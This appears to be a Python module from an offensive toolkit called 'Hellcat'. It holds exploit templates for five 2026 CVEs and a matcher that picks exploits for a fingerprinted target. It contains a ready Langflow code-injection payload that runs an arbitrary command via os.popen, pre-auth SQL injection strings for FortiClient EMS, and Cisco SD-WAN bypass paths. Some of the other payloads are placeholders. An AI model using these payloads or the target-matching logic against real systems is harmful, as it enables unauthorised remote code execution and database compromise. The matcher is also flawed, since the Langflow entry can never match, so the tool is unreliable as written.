"""
Hellcat 2026 Q1 CVE Templates
===============================
Auto-detect + PoC templates for critical 2026 vulnerabilities.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass
class CVETemplate:
    cve_id: str = ""
    name: str = ""
    cvss: float = 0.0
    affected: str = ""
    description: str = ""
    fingerprint: Dict[str, Any] = field(default_factory=dict)
    check_payload: str = ""
    exploit_payload: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)


CVE_2026_TEMPLATES: List[CVETemplate] = [
    CVETemplate(
        "CVE-2026-33017", "Langflow RCE", 9.3, "Langflow < 1.1.1",
        "Missing auth + exec() code injection in flow endpoint",
        {"paths": ["/api/v1/run/", "/api/v1/flows/"], "indicators": ["langflow"]},
        '{"input": "__import__(\'os\').popen(\'id\').read()"}',
        '{"input": "__import__(\'os\').popen(\'{cmd}\').read()"}',
        "Upgrade Langflow >= 1.1.1, restrict /api/v1/run access",
        ["https://nvd.nist.gov/vuln/detail/CVE-2026-33017"],
    ),
    CVETemplate(
        "CVE-2026-21643", "Fortinet FortiClient EMS SQLi", 9.1,
        "FortiClient EMS 7.4.x",
        "Pre-auth SQL injection via tenant header in HTTPS interface",
        {"ports": [443, 8013], "indicators": ["FortiClient", "EMS"]},
        "' OR '1'='1'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "Upgrade FortiClient EMS, restrict management interface access",
        ["https://www.fortiguard.com/psirt"],
    ),
    CVETemplate(
        "CVE-2026-32746", "GNU Telnetd RCE", 9.8,
        "GNU inetutils telnetd (multiple OS)",
        "Unauthenticated remote code execution via telnet daemon",
        {"ports": [23], "banners": ["GNU inetutils", "telnetd"]},
        "\\xff\\xf6\\xff\\xf6",
        "exploit_payload_placeholder",
        "Disable telnet, use SSH instead. Patch inetutils.",
        ["https://nvd.nist.gov/vuln/detail/CVE-2026-32746"],
    ),
    CVETemplate(
        "CVE-2026-20963", "SharePoint Deserialization", 8.8,
        "Microsoft SharePoint Server",
        "Deserialization of untrusted data leading to RCE",
        {"ports": [80, 443], "indicators": ["SharePoint", "MicrosoftSharePointTeamServices"]},
        "/_api/web/GetFileByServerRelativePath",
        "serialized_gadget_payload",
        "Apply Microsoft security patch, restrict API access",
        ["https://msrc.microsoft.com/update-guide"],
    ),
    CVETemplate(
        "CVE-2026-20127", "Cisco SD-WAN Auth Bypass", 9.0,
        "Cisco Catalyst SD-WAN Manager",
        "Authentication bypass in Controller/Manager components",
        {"ports": [443, 8443], "indicators": ["vManage", "SD-WAN"]},
        "/dataservice/client/server/edge/approval",
        "/dataservice/system/device/vedges?action=install",
        "Apply Cisco security advisory patch, restrict management access",
        ["https://sec.cloudapps.cisco.com/security/center"],
    ),
]


class CVETemplateManager:
    """Manage and query 2026 CVE detection templates."""

    _templates: Dict[str, CVETemplate] = {t.cve_id: t for t in CVE_2026_TEMPLATES}

    @classmethod
    def get(cls, cve_id: str) -> Optional[CVETemplate]:
        return cls._templates.get(cve_id)

    @classmethod
    def list_all(cls) -> List[Dict[str, Any]]:
        return [{"cve_id": t.cve_id, "name": t.name, "cvss": t.cvss,
                 "affected": t.affected} for t in cls._templates.values()]

    @classmethod
    def match_target(cls, target_info: Dict[str, Any]) -> List[CVETemplate]:
        """Match CVE templates against target fingerprint."""
        matches = []
        open_ports = set(target_info.get("open_ports", []))
        banners = " ".join(target_info.get("banners", [])).lower()
        headers = " ".join(target_info.get("headers", [])).lower()

        for t in cls._templates.values():
            fp = t.fingerprint
            port_match = bool(open_ports & set(fp.get("ports", [])))
            indicator_match = any(i.lower() in banners + headers
                                 for i in fp.get("indicators", []))
            banner_match = any(b.lower() in banners
                               for b in fp.get("banners", []))
            if port_match and (indicator_match or banner_match):
                matches.append(t)
        return matches

    @classmethod
    def register(cls, template: CVETemplate) -> None:
        cls._templates[template.cve_id] = template
